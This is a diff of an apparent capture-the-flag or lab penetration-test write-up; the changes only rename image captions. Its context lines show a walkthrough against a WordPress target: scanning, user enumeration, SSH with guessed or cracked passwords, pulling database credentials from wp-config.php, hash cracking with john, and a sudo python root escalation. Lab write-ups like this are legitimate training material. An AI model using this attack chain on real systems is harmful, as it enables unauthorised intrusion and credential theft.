@@ -13,7 +13,7 @@ Netdiscover results identify the IP addresses of Targets on the network:
   # netdiscover -r 192.168.1.90
 ```
 
-![nmap output](Images/netdiscover.png)
+![Netdiscover Output](Images/netdiscover.png)
 
 Nmap scan results for each machine reveal the below services and OS details:
 
@@ -21,7 +21,7 @@ Nmap scan results for each machine reveal the below services and OS details:
   # nmap -sV 192.168.1.110
 ```
 
-![nmap output](Images/nmap.png)
+![Nmap Output](Images/nmap.png)
 
 This scan identifies the services below as potential points of entry:
 - Target 1
@@ -55,8 +55,8 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   # wpscan --url 192.168.1.110/wordpress --enumerate u
 ```
 
-![wpscan output](Images/wpscan1.png)
-![wpscan output](Images/wpscan2.png)
+![Wpscan Output 1](Images/wpscan1.png)
+![Wpscan Output 2](Images/wpscan2.png)
 
   - Used SSH to gain a user shell.
     - **Command**: `ssh michael@192.168.1.110`
@@ -66,7 +66,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   # ssh michael@192.168.1.110
 ```
 
-![ssh output](Images/ssh1.png)
+![SSH Output](Images/ssh1.png)
 
   - Searched directories for for service.html to find Flag 1.
     - **Command**: `cat var/www/html/service.html`
@@ -77,7 +77,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - Screenshot of Flag 1:
 
-![flag 1](Images/flag1.png)
+![Flag 1](Images/flag1.png)
 
 ---
 
@@ -94,7 +94,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - Screenshot of Flag 2:
 
-![flag 2](Images/flag2.png)
+![Flag 2](Images/flag2.png)
 
 ---
 
@@ -112,7 +112,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   # nano wp-config.php
 ```
 
-![MySQL DB password](Images/MySQL.png)
+![MySQL DB Password](Images/MySQL.png)
 
   - Used the credentials to log into MySQL and dump WordPress user password hashes.
     - **DB_NAME**:	`wordpress`
@@ -135,11 +135,11 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - Screenshot of Flag 3:
 
-![flag 3](Images/flag3.png)
+![Flag 3](Images/flag3.png)
 
   - Screenshot of WordPress user password hashes:
 
-![password hashes](Images/pwdhashes.png)
+![Password Hashes](Images/pwdhashes.png)
 
 ---
 
@@ -154,13 +154,13 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Command**: `cd ~/Desktop`
     - **Command**: `john hash.txt`
 
-![john output](Images/john.png)
+![John Output](Images/john.png)
 
   - Secure a user shell as the user whose password you cracked.
     - **Command**: `ssh steven@192.168.1.110`
     - **Password**: `pink84`
 
-![ssh output](Images/ssh2.png)
+![SSH Output](Images/ssh2.png)
 
   - Escalating to root:
     - **Command**: `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
@@ -176,4 +176,4 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - Screenshot of Flag 4:
 
-![ssh output](Images/flag4.png)
+![Flag 4](Images/flag4.png)
